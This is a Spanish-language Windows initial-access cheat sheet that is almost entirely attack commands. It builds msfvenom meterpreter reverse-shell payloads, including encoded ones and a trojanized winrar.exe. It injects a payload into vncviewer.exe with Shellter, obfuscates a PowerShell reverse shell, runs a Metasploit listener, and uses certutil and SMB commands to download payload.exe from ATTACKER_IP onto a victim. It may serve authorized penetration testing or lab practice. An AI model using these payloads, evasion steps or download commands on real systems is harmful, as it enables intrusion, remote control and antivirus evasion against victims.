# FOOTHOLD WINDOWS — Payloads, Evasión y Transferencia

## Payloads msfvenom
```bash
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > payload.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o payload.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 10 -f exe > payload_enc.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 10 -f exe -x winrar.exe > trojan.exe
```

## Shellter (inyección PE)
```bash
sudo apt install shellter -y
cp /usr/share/windows-binaries/vncviewer.exe .
sudo wine shellter.exe
# A (auto) → ruta .exe → Y → L → 1 → LHOST → LPORT
python3 -m http.server 80
msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; run"
```

## Invoke-Obfuscation
```bash
git clone https://github.com/danielbohannon/Invoke-Obfuscation
sudo apt install powershell -y && pwsh
# Import-Module ./Invoke-Obfuscation | SET SCRIPTPATH /ruta/reverse.ps1 | AST → ALL → 1
```

## Transferencia de archivos (Windows)
```bash
python3 -m http.server 80
impacket-smbserver recurso $(pwd) -smb2support

# En víctima Windows:
certutil -urlcache -f http://<ATTACKER_IP>/payload.exe payload.exe
copy \\<ATTACKER_IP>\recurso\payload.exe payload.exe
```
